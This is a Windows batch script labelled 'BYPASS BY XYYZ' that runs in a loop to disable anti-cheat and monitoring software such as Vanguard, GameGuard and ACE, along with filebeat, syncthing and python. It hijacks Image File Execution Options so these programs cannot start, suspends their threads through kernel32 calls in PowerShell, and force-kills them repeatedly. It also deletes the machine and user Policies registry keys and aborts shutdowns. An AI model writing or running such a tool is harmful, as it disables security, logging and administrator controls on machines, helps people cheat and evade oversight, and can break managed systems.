@echo off
title BYPASS BY XYYZ - %time%
color 0A

echo ========================================
echo          BYPASS BY XYYZ
echo ========================================
echo.

powercfg -change -monitor-timeout-ac 0
powercfg -change -standby-timeout-ac 0
powercfg -change -disk-timeout-ac 0

:loop

title BYPASS BY XYYZ - %time%

for %%i in (GSDog.exe hm-gs-proxy.exe ACE-Tray.exe Vanguard.exe SGuard.exe CloudGamingDesktop.exe LinkeLauncher.exe QMProxy.exe GameGuard.exe python.exe DeviceDispatchMonitor.exe GameServer.exe syncing-agent.exe syncthing.exe nxpauxsvc.exe filebeat.exe explorer_server.exe TaskBarFider.exe) do (
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%i" /v Debugger /t REG_SZ /d "%SystemRoot%\System32\rundll32.exe" /f 2>nul
)

powershell -ExecutionPolicy Bypass -Command "$Code='[DllImport(\"kernel32.dll\")] public static extern IntPtr OpenThread(uint a, bool b, uint c);[DllImport(\"kernel32.dll\")] public static extern uint SuspendThread(IntPtr h);[DllImport(\"kernel32.dll\")] public static extern int CloseHandle(IntPtr o);';Add-Type -MemberDefinition $Code -Name 'Kernel' -Namespace 'Win32' -ErrorAction SilentlyContinue;$All=@('GSDog','hm-gs-proxy','ACE-Tray','Vanguard','SGuard','CloudGamingDesktop','LinkeLauncher','QMProxy','GameGuard','tencent','wrapper','shell','protect','anti','gs','qgame','DispatchMonitor','GameServer','syncing-agent','syncthing','nxpauxsvc','filebeat','python','explorer_server','TaskBarFider');foreach($T in $All){$P=Get-Process -Name $T -ErrorAction SilentlyContinue;if($P){foreach($Th in $P.Threads){$h=[Win32.Kernel]::OpenThread(0x0002,$false,$Th.Id);[Win32.Kernel]::SuspendThread($h);[Win32.Kernel]::CloseHandle($h)};Stop-Process -Name $T -Force -ErrorAction SilentlyContinue}}"

taskkill /f /im GSDog.exe 2>&1
taskkill /f /im hm-gs-proxy.exe 2>&1
taskkill /f /im ACE-Tray.exe 2>&1
taskkill /f /im Vanguard.exe 2>&1
taskkill /f /im SGuard.exe 2>&1
taskkill /f /im CloudGamingDesktop.exe 2>&1
taskkill /f /im LinkeLauncher.exe 2>&1
taskkill /f /im QMProxy.exe 2>&1
taskkill /f /im GameGuard.exe 2>&1
taskkill /f /im tencent*.exe 2>&1
taskkill /f /im wrapper*.exe 2>&1
taskkill /f /im protect*.exe 2>&1
taskkill /f /im anti*.exe 2>&1
taskkill /f /im gs*.exe 2>&1
taskkill /f /im python.exe 2>&1
taskkill /f /im DeviceDispatchMonitor.exe 2>&1
taskkill /f /im GameServer.exe 2>&1
taskkill /f /im syncing-agent.exe 2>&1
taskkill /f /im syncthing.exe 2>&1
taskkill /f /im nxpauxsvc.exe 2>&1
taskkill /f /im filebeat.exe 2>&1
taskkill /f /im explorer_server.exe 2>&1
taskkill /f /im TaskBarFider.exe 2>&1

wmic process where "name='GSDog.exe'" delete 2>&1
wmic process where "name='hm-gs-proxy.exe'" delete 2>&1
wmic process where "name='ACE-Tray.exe'" delete 2>&1
wmic process where "name='Vanguard.exe'" delete 2>&1
wmic process where "name='SGuard.exe'" delete 2>&1
wmic process where "name='CloudGamingDesktop.exe'" delete 2>&1
wmic process where "name='LinkeLauncher.exe'" delete 2>&1
wmic process where "name='QMProxy.exe'" delete 2>&1
wmic process where "name='GameGuard.exe'" delete 2>&1
wmic process where "name='syncing-agent.exe'" delete 2>&1
wmic process where "name='syncthing.exe'" delete 2>&1
wmic process where "name='nxpauxsvc.exe'" delete 2>&1
wmic process where "name='filebeat.exe'" delete 2>&1
wmic process where "name='python.exe'" delete 2>&1
wmic process where "name='explorer_server.exe'" delete 2>&1
wmic process where "name='TaskBarFider.exe'" delete 2>&1

powershell -ExecutionPolicy Bypass -Command "Get-Process|Where-Object{$_.Name -match 'GSDog|hm-gs-proxy|ACE-Tray|Vanguard|SGuard|Cloud|Linke|QMProxy|GameGuard|tencent|wrapper|protect|anti|syncing|syncthing|nxpaux|filebeat|python|explorer_server|TaskBarFider'}|Stop-Process -Force -ErrorAction SilentlyContinue"

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /f 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies" /f 2>&1

shutdown /a 2>&1

powershell -ExecutionPolicy Bypass -Command "$wsh=New-Object -ComObject WScript.Shell;$wsh.SendKeys('{F15}')" 2>&1

taskkill /f /im explorer.exe 2>&1
timeout /t 2 /nobreak >nul
start explorer.exe
